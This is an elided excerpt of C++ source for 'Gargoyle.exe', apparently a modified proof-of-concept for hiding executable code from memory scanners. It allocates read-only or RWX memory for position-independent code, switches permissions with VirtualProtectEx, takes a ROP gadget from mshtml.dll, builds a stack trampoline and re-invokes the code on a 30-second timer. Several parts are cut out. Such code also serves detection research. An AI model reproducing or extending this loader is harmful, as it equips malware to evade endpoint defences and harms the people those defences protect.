...
namespace {
  ...
  constexpr DWORD invocation_interval_ms = 30 * 1000;
...
MyTuple allocate_pic(const string& filename, int changePermissions) {
  LPVOID pic = NULL;
  ...
  if (changePermissions == 1) {
	  pic = VirtualAllocEx(GetCurrentProcess(), nullptr, pic_size, MEM_COMMIT | MEM_RESERVE, PAGE_READONLY);
	  printf("Allocating memory with RO\n");

  }
  else {
	  pic = VirtualAllocEx(GetCurrentProcess(), nullptr, pic_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	  printf("Allocating memory with RWX\n");
  }
  if (!pic) throw runtime_error("[-] Couldn't VirtualAllocEx: " + GetLastError());
  if (changePermissions == 1) {
	  DWORD oldProtection;
	  VirtualProtectEx(GetCurrentProcess(), pic, pic_size, PAGE_EXECUTE_READWRITE, &oldProtection);
  }
...
void* get_gadget(bool use_system_dll, const string& gadget_system_dll_filename, const string& gadget_pic_path, int changePermissions) {
  void* memory;
  if (use_system_dll) {
  ...
  if (!use_system_dll || !memory) {
    ...
    size_t size;
    tie(memory, size) = allocate_pic(gadget_pic_path, changePermissions);
    printf("[+] Allocated %u bytes for gadget PIC.\n", size);
  }
  return memory;
}

void launch(const string& setup_pic_path, const string& gadget_system_dll_filename, const string& gadget_pic_path, int changePermissions) {
  printf("[ ] Allocating executable memory for \"%s\".\n", setup_pic_path.c_str());
  void* setup_memory; size_t setup_size;
  tie(setup_memory, setup_size) = allocate_pic(setup_pic_path, changePermissions);
  printf("[+] Allocated %d bytes for PIC.\n", setup_size);

  auto use_system_dll{ true };
  printf("[ ] Configuring ROP gadget.\n");
  auto gadget_memory = get_gadget(use_system_dll, gadget_system_dll_filename, gadget_pic_path, changePermissions);
  ...
  printf("[+] Stack trampoline built at address 0x%p.\n", &tramp);
...
int main(int argc, char* argv[]) {
  printf("Usage:\nGargoyle.exe    // runs like the original\nGargoyle.exe 0 some_dll_containing_rop_gadget.dll     // almost same as original, except for cmd line specification of dll\nGargoyle.exe 1 [DLL]    // initial permission for memory section is RO, dll is optional\n\n");
  try {
	  int changePermissions = 0;
	  char* dll = "mshtml.dll";
	  if (argc > 1) {
		  changePermissions = atoi(argv[1]);
		  if (argc > 2)
			  dll = argv[2];
	  }
	  launch("setup.pic", dll, "gadget.pic", changePermissions);
